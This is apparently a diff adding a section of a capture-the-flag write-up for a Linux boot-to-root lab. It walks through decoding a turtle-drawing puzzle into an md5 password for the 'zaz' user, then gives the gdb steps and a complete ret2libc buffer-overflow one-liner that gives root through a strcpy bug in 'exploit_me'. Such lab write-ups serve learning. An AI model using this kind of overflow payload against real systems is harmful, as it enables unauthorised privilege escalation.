@@ -261,14 +261,50 @@ Let's check what the types of files do we have:
 
 
 
+So we know that we need to log in as thor with the password we learned from bomb.
+After we logged in we do `ls` and see README file with the line :
 
+> Finish this challenge and use the result as password for 'zaz' user.
 
+and turtle file. 
 
+We copied it to our computr and made some reserch. And it ocures that it has not that many commands as it seemed.
 
+After some google reserch we find the script that can help us to recreate the drawing.
+So we need to run turtle_code_transf.py by running in a command line: 
 
+> python turtle_code_transf.py
 
+It generates a second executable file that shows us a word `SLASH` written by a turtle.  :) 
 
+So we try to use this word to get into zaz account (README file instuction). 
+And it's not coreect. So we thought that the password might be the incripted version of this word. 
+We used several incription methods but only md5 worked. Using online convertor we got a password - `646DA671CA01BB5D84DBB5FB2238DC8E`.
+This password didn't work. So we tried to write `SLASH` in mall letters and get the code. And this worked! So the password for zaz account is `646da671ca01bb5d84dbb5fb2238dc8e`.
 
+So we got into the zaz account and see 2 files: 
+- exploit_me
+- mail
 
+We can use gdb - debagger - to see what we have. So 
+> gdb
+> file exploit_me
+> dissas main
 
+We see (screenshot 4) that the that program uses 140 bytes and tries to compare a string without any length validation with insecure "strcpy" and we can try to overflow the buffer. 
+We can use ret2libc attack for that. But we need to know the system address and the exit address. So we nned to do the following:
+> b main - to set a breakpoint at main function
+> run - to start a program
+> p system - prints system address - `$1 = {<text variable, no debug info>} 0xb7e6b060 <system>`
+> p exit - prints exit address - `$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>`
+> quit - we have all information we need. 
+
+Now we can overflow the buffer using python. Run:
+> ./exploit_me $(python -c "print('.'*140 + '\xb7\xe6\xb0\x60'[::-1]+'\xb7\xe5\xeb\xe0'[::-1]+'\xb7\xf8\xcc\x58'[::-1])")
+
+The result of execution of this command will be you getting to the root. 
+
+You may check it by using command `whoami` and you'll receive an answer - root :) 
+
+Thats all for today! Thank you! 
 
